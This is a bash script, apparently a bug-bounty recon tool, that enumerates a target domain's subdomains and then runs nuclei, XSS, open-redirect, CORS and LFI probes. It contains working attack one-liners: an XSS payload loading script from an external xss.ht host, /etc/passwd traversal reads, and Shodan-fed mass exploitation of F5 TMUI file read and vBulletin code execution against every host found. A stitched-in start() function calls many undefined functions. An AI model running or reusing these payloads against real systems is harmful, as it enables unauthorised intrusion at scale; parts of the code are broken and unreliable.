#!/bin/bash
domain=$1

# TERM COLORS
bred='\033[1;31m'
bblue='\033[1;34m'
bgreen='\033[1;32m'
byellow='\033[1;33m'
red='\033[0;31m'
blue='\033[0;34m'
green='\033[0;32m'
yellow='\033[0;33m'
reset='\033[0m'


#Default_Paths
wordlist="/root/tools/SecLists/Discovery/DNS/deepmagic.com-prefixes-top500.txt"
resolvers="/root/tools/resolvers.txt"
resolve_domain="/root/tools/massdns/bin/massdns -r /root/tools/resolvers.txt -t A -o S -w"
NOTIFY_CONFIG='~/.config/notify/provider-config.yaml'
notify=$NOTIFY
#recon_version=""


    printf "\n${bgreen}"
    printf "            ____                                \n " 
    printf "          |  _ \ ___  ___ ___  _ __             \n"
    printf "           | |_) / _ \/ __/ _ \| '_ \           \n"
    printf "           |  _ <  __/ (_| (_) | | | |          \n"
    printf "           |_| \_\___|\___\___/|_| |_|          \n${reset}"
   
                                                                      
    printf " ${recon_version}                                 by @e1pr0f3ss0r \n\n\n"



printf "${byellow}###################### Select Scan Option #######################\n" 

echo "1)  Scan-All"
echo "2)  Domain-enum"
echo "3)  Resolve Domain "
echo "4)  HTTP_Probe  "
echo "5)  Nuclei_scan" 
echo "6)  wayback" 
echo "7)  valid_urls" 
echo "8)  gf_patterns" 
echo "9)  eyewitness" 
echo "10) blind_ssrf" 
echo "11) xss_qsreplace"
echo "12) paramspider_dalfox"
echo "13) detection_op"
echo "14) 1-liner-Scripts"
echo "15) Quite"
echo -en ${bblue}"Select Scan Option: ${reset}" 


read scan ;
    
    echo -e "\e[1;33m ******* Enumerating For \e[5m\e[96m $domain \e[25m\e[1;33m With_Tools ********\e[0m"  

function domain_enum(){
    echo "Subdomain Enumeration Process Started for $domain" | notify -silent    
    mkdir -p $domain $domain/nuclei/ $domain/Miscs/ $domain/wayback_data/ $domain/sources/  $domain/Recon/ $domain/Recon/Knockpy/ $domain/Recon/findomain/ $domain/Recon/github_subdomains/  $domain/Recon/wayback/  $domain/Recon/ssrf/ $domain/Recon/Params/  $domain/Recon/eyewitness/ $domain/Recon/gf/ $domain/Recon/wordlist/  $domain/Recon/masscan/ 
    subfinder -d $domain -all -o $domain/sources/subfinder.txt
    assetfinder -subs-only $domain | tee -a /root/tmp/assetfinder_psub.txt | anew -q $domain/assetfinder.txt
    xterm -title "Amass" -hold -e "amass enum -passive -d $domain  -o $domain/sources/passive.txt" & disown
    findomain --quiet -t $domain -u $domain/Recon/findomain/findomain_psub.txt 
    shuffledns -d  $domain -w $wordlist -r $resolvers -o $domain/sources/shuffledns.txt 
    cat $domain/sources/*.txt  > $domain/sources/all.txt 
    sendToNotify
    notification 
    sleep 3      
}

function resolving_domains(){

    echo "Subdomain Enumeration Finished" | notify -silent

    cat $domain/sources/all.txt | naabu -o $domain/Recon/naabu-output.txt -silent
    
    shuffledns -d   $domain -list $domain/sources/all.txt -o $domain/domains.txt -r $resolvers -silent
    xterm -title "DNS_ENUM" -hold -e "knockpy  $domain -w $wordlist | tee -a $domain/Recon/Knockpy/knockpy_result.txt" & disown
}


function http_prob(){
    
    cat $domain/sources/all.txt | httpx -threads 200 -o $domain/domains.txt
    # curl -s --show-error -H 'Content-Type: application/json' --data '{ "include_merged_yaml": true, "content": "include:\n  remote: c5or65l46prin99ugaagcfa5gfayyyyyn.interactsh.com/api/v1/targets?test.yml"}' https://REDACTED/api/v4/ci/lint -k
  

}

function scanner(){

echo -e "\e[1;33m******* Scanning\e[5m\e[96m $domain \e[25m\e[1;33mWith_Nuclei ********\e[0m"

#xterm -title "KiteRunners" -hold -e "kr scan $domain/sources/all.txt -w /root/kiterunner/routes-large.kite  -x 20 -j 100 --ignore-length=1053" & disown 
nuclei -update -silent
nuclei -ut   -silent
cat  $domain/sources/all.txt | nuclei    -tags misc /root/nuclei-templates/cnvd/ -c 60 -o $domain/nuclei/cnvd.txt
cat  $domain/sources/all.txt | nuclei    -tags misc /root/nuclei-templates/bugs-misconfigs/ -c 60 -o $domain/nuclei/bugs-misconfigs.txt
cat  $domain/sources/all.txt | nuclei    -tags misc /root/nuclei-templates/fuzzing/    -c 60 -o $domain/nuclei/fuzzing.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/cves/ -c 60 -o $domain/nuclei/cves.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc/root/nuclei-templates/files/ -c 60 -o $domain/nuclei/files.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/exposed-panels/ -c 60 -o $domain/nuclei/panels.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/misconfiguration/ -c 60 -o $domain/nuclei/misconfiguration.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc/root/nuclei-templates/technologies/ -c 60 -o $domain/nuclei/technologies.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/takeovers/ -c 60 -o $domain/nuclei/tokens.txt
cat  $domain/sources/all.txt | nuclei   -tags misc  /root/nuclei-templates/vulnerabilities/ -c 60 -o $domain/nuclei/vulnerabilities.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/bugs-misconfigs/ -c 60 -o $domain/nuclei/bugs-misconfigs.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/exposures/ -c 60 -o $domain/nuclei/exposures.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/workflows/ -c 60 -o $domain/nuclei/workflow.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/helpers/wordlists/ -c 60 -o $domain/nuclei/helpers.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/helpers/payloads/ -c 60 -o $domain/nuclei/payloads.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc /root/nuclei-templates/default-logins/ -c 60 -o $domain/nuclei/default-logins.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc  /root/nuclei-templates/exposures/ -c 60 -r $resolvers_trusted -retries 3 -o $domain/nuclei/exposure.txt
cat  $domain/sources/all.txt | nuclei   -silent  -tags misc  /root/nuclei-templates/network/  -c 60 -o $domain/nuclei/network.txt
cat  $domain/sources/all.txt | nuclei   -silent   -tags misc  /root/nuclei-templates/dns/ -c 60 -o $domain/nuclei/dns.txt
cat  $domain/sources/all.txt | nuclei   -silent    -tags misc  /root/nuclei-templates/headless/ -c 60 -o $domain/nuclei/headless.txt
cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/token-spray/ -c 60 -o $domain/nuclei/tokenspray.txt

# cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/xml-schema-detect.yaml  -c 60 -o $domain/nuclei/xml-schema-detect.txt
# # cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/
# cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/
# cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/
# cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/
# cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/
# cat  $domain/sources/all.txt | nuclei      -tags misc  /root/nuclei-templates/
# if [ $? > "0" ] ; then
#     echo "Nuclei_scan got Error" | notify -silent
# else    
#     echo "Scan_Finished" | notify -silent
# fi    
}



function wayback_data(){

for i in $(cat $domain/sources/all.txt);do echo $i | waybackurls ;done | tee -a $domain/wb.txt

    cat $domain/wb.txt  | sort -u | unfurl --unique keys | tee -a $domain/wayback_data/paramlist.txt -silent

    cat $domain/wb.txt  | grep -P "\w+\.js(\?|$)" | sort -u | tee -a $domain/wayback_data/jsurls.txt -silent

    cat $domain/wb.txt  | grep -P "\w+\.php(\?|$)" | sort -u  | tee -a $domain/wayback_data/phpurls.txt -silent

    cat $domain/wb.txt  | grep -P "\w+\.aspx(\?|$)" | sort -u  | tee -a $domain/wayback_data/aspxurls.txt -silent

    cat $domain/wb.txt  | grep -P "\w+\.jsp(\?|$)" | sort -u | tee -a $domain/wayback_data/jspurls.txt -silent

    cat $domain/wb.txt  | grep -P "\w+\.txt(\?|$)" | sort -u  | tee -a $domain/wayback_data/robots.txt -silent
}


function valid_urls(){

    cat $domain/domains.txt | waybackurls | tee -a  $domain/Recon/wayback/tmp.txt
    cat $domain/Recon/wayback/tmp.txt | egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.css|\.ico" | sed 's/:80//g;s/:443//g' | sort -u >> $domain/Recon/wayback/wayback.txt
    rm  $domain/Recon/wayback/tmp.txt
    cat $domain/Recon/wayback/wayback.txt | unfurl -unique paths > $domain/Recon/wordlist/paths.txt
    cat $domain/Recon/wayback/wayback.txt | unfurl -unique keys  > $domain/Recon/wordlist/params.txt
    gau $domain | unfurl -u keys | tee -a $domain/wordlist.txt ; gau $domain | unfurl -u paths|tee -a ends.txt; sed 's#/#\n#g' ends.txt  | sort -u | tee -a $domain/wordlist-1.txt | sort -u ;rm ends.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' $domain/Recon/wordlist/wordlist.txt -silent
  
    ffuf -c -u "FUZZ" -w $domain/Recon/wayback/wayback.txt -of csv -o $domain/Recon/wayback/valid-tmp.txt -silent
    cat $domain/Recon/wayback/valid-tmp.txt | grep http | awk -F ","  '{print $1}' > $domain/Recon/wayback/valid.txt -silent
    rm -r $domain/Recon/wayback/valid-tmp.txt  

}

function gf_patterns(){

    gf redirect | qsreplace "evil.com" | httpx -silent -status-code -location | tee -a $domain/Recon/gf/redirect.txt
    gf xss  $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/xss.txt
    gf sqli $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/sqli.txt
    gf cors $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/cors.txt
    gf idor $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/idor.txt
    gf firebase $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/firebase.txt
    gf takeover  $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/takeover.txt
    gf rce  $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/rce.txt
    gf lfi  $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/lfi.txt
    gf s3-buckets  $domain/Recon/wayback/valid.txt | tee -a $domain/Recon/gf/s3-buckets.txt
    gf ssti $domain/Recon/wayback/valid.txt | tee -a  $domain/Recon/gf/ssti.txt
    gf img-traversal $domain/Recon/wayback/valid.txt | tee -a  $domain/Recon/gf/img-traversal.txt 
    gf servers $domain/Recon/wayback/valid.txt | tee -a  $domain/Recon/gf/servers.txt 
}

function eyewitness(){
    
    terminator  -e   "eyewitness --web -f $domain/domains.txt -d $domain/Recon/eyewitness/screenshots" -p hold &&
    
    for I in $(ls); do
        echo "$I" >> $domain/Recon/eyewitness/index.html;
        echo "<img src=$I><br>" >> $domain/Recon/eyewitness/index.html;
    done
}

function blind_ssrf(){
    
    cat $domain/Recon/wayback/wayback.txt | gf ssrf | sort -u >> $domain/Recon/ssrf/blindssrf.txt
}

function xss_qsreplace(){

    cat $domain/wayback_data/paramlist.txt | qsreplace -a | grep 'FUZZ' | qsreplace '<img src=x oneonerrorrror=aalertlert()>' | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "oneonerrorrror=aalertlert()" && echo -e "$host \033[0;31m" Vulnerable;done | anew $domain/Recon/qs-xss.txt 
    cat $domain/Recon/wayback/wayback.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I|grep "evil.com" && echo -e "$host  \033[0;31mVulnerable\n" | anew $domain/Recon/openredirect.txt; done
    # ffuf -c -u "FUZZ///ij57ympq3ko6dgud3ollw4nqwh27qw.burpcollaborator.net" -r -w $domain/Recon/openredirect.txt -mr "bounty" | anew open-Rx.txt
    # cat valid.txt | qsreplace "burpcolabo" | anew redirect.txt
    # ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
    # cat $domain/Recon/domains.txt | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > $domain/Recon/gau-fuzzing.txt
    #  ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy http://127.0.0.1:8080
}

function paramspider_dalfox(){

    terminator  -e   "python3 /root/tools/ParamSpider/./paramspider.py --domain $domain  -o $domain/Recon/Params/params.txt" -p hold &&

    dalfox file $domain/wayback_data/paramlist.txt  -b e1pr0f3ss0r.xss.ht -o $domain/Recon/Params/xss.txt 
    cat $domain/wayback_data/paramlist.txt | grep FUZZ | qsreplace '"><script src=https://e1pr0f3ss0r.xss.ht></script>' | tee -a combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs '"><script src=https://e1pr0f3ss0r.xss.ht>' && echo -e "$host \033[0;31mVulnerable\n" | tee -a Vuln-xss.txt;done
}

function detection_op(){

    echo "Looking for HTTP request smugglig"
    python3 ~/smuggler/smuggler.py -u $domain/sources/all.txt | tee -a $domain/smuggler_op.txt


    echo "Now looking for CORS misconfiguration"
    python3 ~/Corsy/corsy.py -i $domain/sources/all.txt -t 40 | tee -a $domain/corsy_op.txt

    echo "Starting CMS detection"
    whatweb -i $domain/sources/all.txt | tee -a $domain/whatweb_op.txt

    echo "Starting CORS detection"
    gau $domain | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done | tee -a $domain/Recon/CORS.txt

}

function custom_1_liner(){

    gau $domain | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | anew -q $domain/Recon/gf/lfi-2.txt
    export LHOST="http://localhost"; gau $domain| gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"' | anew -q $domain/Recon/gf/open-redirect.txt
    gospider -S $domain/Recon/findomain/findomain_psub.txt  -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee $domain/Recon/xss-result.txt
    shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
    shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
    # assetfinder $domain | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done | anew -q $domain/Recon/main.js
    cat $domain/Recon/main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
    #CORS
    gau $domain | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done | tee -a $domain/Recon/CORS.txt
    # ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'    
    for sub in $(cat $domain/domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a $domain/Miscs/jucy-info.txt  ;done
        
}

function start(){

    global_start=$(date +%s)

    if [ "$NOTIFICATION" = true ]; then
        $NOTIFY -silent
    else
        $NOTIFY=""
    fi

    if [[ $(id -u | grep -o '^0$') == "0" ]]; then
        SUDO=" "
    else
        SUDO="sudo"
    fi
    #[[ -n "$domain" ]] && ipcidr_target $domain

    if [ -s "$list" ]; then
         sed -i 's/\r$//' $list
        targets=$(cat $list)
    else
        notification "Target list not provided" error
        exit
    fi


    workdir=$SCRIPTPATH/Recon/$multi
    mkdir -p $workdir  || { echo "Failed to create directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
    cd "$workdir"  || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }

    mkdir -p .tmp .log .called_fn osint subdomains webs hosts vulns

    NOW=$(date +"%F")
    NOWT=$(date +"%T")
    LOGFILE="${dir}/.log/${NOW}_${NOWT}.txt"
    touch .log/${NOW}_${NOWT}.txt
    echo "Start ${NOW} ${NOWT}" > ${LOGFILE}

    [ -n "$flist" ] && LISTTOTAL=$(cat "$flist" | wc -l )

    for domain in $targets; do
        dir=$workdir/targets/$domain
        called_fn_dir=$dir/.called_fn
        mkdir -p $dir
        cd "$dir"  || { echo "Failed to cd directory '$dir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
        mkdir -p .tmp .log .called_fn osint subdomains webs hosts vulns

        NOW=$(date +"%F")
        NOWT=$(date +"%T")
        LOGFILE="${dir}/.log/${NOW}_${NOWT}.txt"
        touch .log/${NOW}_${NOWT}.txt
        echo "Start ${NOW} ${NOWT}" > ${LOGFILE}
        loopstart=$(date +%s)

        domain_info
        ip_info
        emails
        google_dorks
        github_dorks
        metadata
        zonetransfer
        favicon
        currently=$(date +"%H:%M:%S")
        loopend=$(date +%s)
        getElapsedTime $loopstart $loopend
        printf "${bgreen}#######################################################################${reset}\n"
        printf "${bgreen} $domain finished 1st loop in ${runtime}  $currently ${reset}\n"
        if [ -n "$flist" ]; then
            POSINLIST=$(eval grep -nrE "^$domain$" "$flist" | cut -f1 -d':')
            printf "\n${yellow}  $domain is $POSINLIST of $LISTTOTAL${reset}\n"
        fi
        printf "${bgreen}#######################################################################${reset}\n"
    done
    cd "$workdir"  || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }

    if [ "$AXIOM" = true ]; then
        axiom_lauch
        axiom_selected
    fi

    for domain in $targets; do
        loopstart=$(date +%s)
        dir=$workdir/targets/$domain
        called_fn_dir=$dir/.called_fn
        cd "$dir"  || { echo "Failed to cd directory '$dir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
        subdomains_full
        subtakeover
        remove_big_files
        webprobe_full
        screenshot
        portscan
        cloudprovider
        currently=$(date +"%H:%M:%S")
        loopend=$(date +%s)
        getElapsedTime $loopstart $loopend
        printf "${bgreen}#######################################################################${reset}\n"
        printf "${bgreen} $domain finished 2nd loop in ${runtime}  $currently ${reset}\n"
        if [ -n "$flist" ]; then
            POSINLIST=$(eval grep -nrE "^$domain$" "$flist" | cut -f1 -d':')
            printf "\n${yellow}  $domain is $POSINLIST of $LISTTOTAL${reset}\n"
        fi
        printf "${bgreen}#######################################################################${reset}\n"
    done
    cd "$workdir"  || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }

    notification "############################# Total data ############################" info
    NUMOFLINES_users_total=$(find . -type f -name 'users.txt' -exec cat {} + | anew osint/users.txt | wc -l)
    NUMOFLINES_pwndb_total=$(find . -type f -name 'passwords.txt' -exec cat {} + | anew osint/passwords.txt | wc -l)
    NUMOFLINES_software_total=$(find . -type f -name 'software.txt' -exec cat {} + | anew osint/software.txt | wc -l)
    NUMOFLINES_authors_total=$(find . -type f -name 'authors.txt' -exec cat {} + | anew osint/authors.txt | wc -l)
    NUMOFLINES_subs_total=$(find . -type f -name 'subdomains.txt' -exec cat {} + | anew subdomains/subdomains.txt | wc -l)
    NUMOFLINES_subtko_total=$(find . -type f -name 'takeover.txt' -exec cat {} + | anew webs/takeover.txt | wc -l)
    NUMOFLINES_webs_total=$(find . -type f -name 'webs.txt' -exec cat {} + | anew webs/webs.txt | wc -l)
    NUMOFLINES_webs_total=$(find . -type f -name 'webs_uncommon_ports.txt' -exec cat {} + | anew webs/webs_uncommon_ports.txt | wc -l)
    NUMOFLINES_ips_total=$(find . -type f -name 'ips.txt' -exec cat {} + | anew hosts/ips.txt | wc -l)
    NUMOFLINES_cloudsprov_total=$(find . -type f -name 'cloud_providers.txt' -exec cat {} + | anew hosts/cloud_providers.txt | wc -l)
    find . -type f -name 'portscan_active.txt' -exec cat {} + > hosts/portscan_active.txt 2>>"$LOGFILE" &>/dev/null
    find . -type f -name 'portscan_active.gnmap' -exec cat {} + > hosts/portscan_active.gnmap 2>>"$LOGFILE" &>/dev/null
    find . -type f -name 'portscan_passive.txt' -exec cat {} + > hosts/portscan_passive.txt 2>>"$LOGFILE" &>/dev/null

    notification "- ${NUMOFLINES_users_total} total users found" good
    notification "- ${NUMOFLINES_pwndb_total} total creds leaked" good
    notification "- ${NUMOFLINES_software_total} total software found" good
    notification "- ${NUMOFLINES_authors_total} total authors found" good
    notification "- ${NUMOFLINES_subs_total} total subdomains" good
    notification "- ${NUMOFLINES_subtko_total} total probably subdomain takeovers" good
    notification "- ${NUMOFLINES_webs_total} total websites" good
    notification "- ${NUMOFLINES_ips_total} total ips" good
    notification "- ${NUMOFLINES_cloudsprov_total} total IPs belongs to cloud" good
    s3buckets
    waf_checks
    nuclei_check
    for domain in $targets; do
        loopstart=$(date +%s)
        dir=$workdir/targets/$domain
        called_fn_dir=$dir/.called_fn
        cd "$dir" || { echo "Failed to cd directory '$dir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
        loopstart=$(date +%s)
        fuzz
        urlchecks
        jschecks
        currently=$(date +"%H:%M:%S")
        loopend=$(date +%s)
        getElapsedTime $loopstart $loopend
        printf "${bgreen}#######################################################################${reset}\n"
        printf "${bgreen} $domain finished 3rd loop in ${runtime}  $currently ${reset}\n"
        if [ -n "$flist" ]; then
            POSINLIST=$(eval grep -nrE "^$domain$" "$flist" | cut -f1 -d':')
            printf "\n${yellow}  $domain is $POSINLIST of $LISTTOTAL${reset}\n"
        fi
        printf "${bgreen}#######################################################################${reset}\n"
    done

    if [ "$AXIOM" = true ]; then
        axiom_shutdown
    fi

    for domain in $targets; do
        loopstart=$(date +%s)
        dir=$workdir/targets/$domain
        called_fn_dir=$dir/.called_fn 
        cd "$dir" || { echo "Failed to cd directory '$dir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
        cms_scanner
        url_gf
        wordlist_gen
        wordlist_gen_roboxtractor
        password_dict
        url_ext
        currently=$(date +"%H:%M:%S")
        loopend=$(date +%s)
        getElapsedTime $loopstart $loopend
        printf "${bgreen}#######################################################################${reset}\n"
        printf "${bgreen} $domain finished final loop in ${runtime}  $currently ${reset}\n"
        if [ -n "$flist" ]; then
            POSINLIST=$(eval grep -nrE "^$domain$" "$flist" | cut -f1 -d':')
            printf "\n${yellow}  $domain is $POSINLIST of $LISTTOTAL${reset}\n"
        fi
        printf "${bgreen}#######################################################################${reset}\n"
    done
    cd "$workdir" || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
    dir=$workdir
    domain=$multi
    end
}

function notification(){
    
      if [ -n "$1" ] && [ -n "$2" ]; then

        case $sendToNotify in 
            info)
                text="\n${bblue} ${1} ${reset}"
                printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
            ;;
            warn)
                text="\n${yellow} ${1} ${reset}"
                printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
            ;;
            error)
                text="\n${bred} ${1} ${reset}"
                printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
            ;;
            good)
                text="\n${bgreen} ${1} ${reset}"
                printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
            ;;
        esac
    fi
}

function sendToNotify {
    if [[ -z "$1" ]]; then
        printf "\n${yellow} no file provided to send ${reset}\n"
    else
        if [[ -z "$NOTIFY_CONFIG" ]]; then
            NOTIFY_CONFIG=~/.config/notify/provider-config.yaml
        fi
        if grep -q '^ telegram\|^telegram\|^    telegram' $NOTIFY_CONFIG ; then
            notification "Sending ${domain} data over Telegram" info
            telegram_chat_id=$(cat ${NOTIFY_CONFIG} | grep '^ telegram_chat_id\|^telegram_chat_id\|^    telegram_chat_id' | xargs | cut -d' ' -f2)
            telegram_key=$(cat ${NOTIFY_CONFIG} | grep '^ telegram_apikey\|^telegram_apikey\|^    telegram_apikey' | xargs | cut -d' ' -f2 )
            curl -F document=@${1} "https://api.telegram.org/bot${telegram_key}/sendDocument?chat_id=${telegram_chat_id}" &>/dev/null
        fi
        if grep -q '^ discord\|^discord\|^    discord' $NOTIFY_CONFIG ; then
            notification "Sending ${domain} data over Discord" info
            discord_url=$(cat ${NOTIFY_CONFIG} | grep '^ discord_webhook_url\|^discord_webhook_url\|^    discord_webhook_url' | xargs | cut -d' ' -f2)
            curl -v -i -H "Accept: application/json" -H "Content-Type: multipart/form-data" -X POST -F file1=@${1} $discord_url &>/dev/null
        fi
        if [[ -n "$slack_channel" ]] && [[ -n "$slack_auth" ]]; then
            notification "Sending ${domain} data over Slack" info
            curl -F file=@${1} -F "initial_comment=reconftw zip file" -F channels=${slack_channel} -H "Authorization: Bearer ${slack_auth}" https://slack.com/api/files.upload &>/dev/null
        fi
    fi
}

function scan_all(){

    echo -e "\e[1;33m*************\e[5m\e[96m Enumerating Domains for $domain.....\e[25m\e[1;33m*************\e[0m" 
    domain_enum
    echo -e "\e[1;33m*************\e[5m\e[96m Resolving Domains For $domain.....\e[25m\e[1;33m*************\e[0m" 
    resolving_domains
    echo -e "\e[1;33m*************\e[5m\e[96m Probing HTTP Requests For $domain......\e[25m\e[1;33m*************\e[0m" 
    http_prob 
    echo -e "\e[1;33m*************\e[5m\e[96m Performing Nuclei Scan for $domain......\e[25m\e[1;33m*************\e[0m" 
    scanner
    echo -e "\e[1;33m*************\e[5m\e[96m Collecting WaybackURLS for $domain.....\e[25m\e[1;33m*************\e[0m" 
    wayback_data 
    echo -e "\e[1;33m*************\e[5m\e[96m Sorting ValidURLS......\e[25m\e[1;33m*************\e[0m"
    valid_urls 
    echo -e "\e[1;33m*************\e[5m\e[96m Performing GF Patterns.....\e[25m\e[1;33m*************\e[0m"
    gf_patterns
    echo -e "\e[1;33m*************\e[5m\e[96m Collecting Screenshots Using Eyewitness....\e[25m\e[1;33m*************\e[0m"
    eyewitness 
    echo -e "\e[1;33m*************\e[5m\e[96m Checking For BlindSSRF.....\e[25m\e[1;33m*************\e[0m"
    blind_ssrf 
    echo -e "\e[1;33m*************\e[5m\e[96m Checking For XSS using QS_replace......\e[25m\e[1;33m*************\e[0m"
    xss_qsreplace 
    echo -e "\e[1;33m*************\e[5m\e[96m Running Paramspider_Dalfox.....\e[25m\e[1;33m*************\e[0m"
    paramspider_dalfox 
    echo -e "\e[1;33m*************\e[5m\e[96m Running for Detection.....\e[25m\e[1;33m*************\e[0m"
    detection_op
    echo -e "\e[1;33m*************\e[5m\e[96m Performing Custom 1_lines.... \e[25m\e[1;33m*************\e[0m"
    custom_1_liner 
    sendToNotify
    notification 
    
}

# function exit1(){
#     clear
# }
case $scan in
       1) "scan_all"   ;;
       2) "domain_enum" ;;
       3) "resolving_domains" ;;
       4) "http_prob" ;;
       5) "scanner" ;;
       6) "wayback_data" ;;
       7) "valid_urls"   ;;
       8) "gf_patterns"  ;;
       9) "eyewitness" ;;
       10) "blind_ssrf" ;;
       11) "xss_qsreplace" ;;
       12) "paramspider_dalfox" ;;
       13) "detection_op" ;;
       14) "custom_1_liner" ;;
       15)  echo -e "\e[1;33m*************\e[5m\e[96m Exiting.... \e[25m\e[1;33m*************\e[0m";
            sleep 3;
            clear;
            ;;
             
   
       *) echo "Scan Type doesn't Exist" ;;

    esac
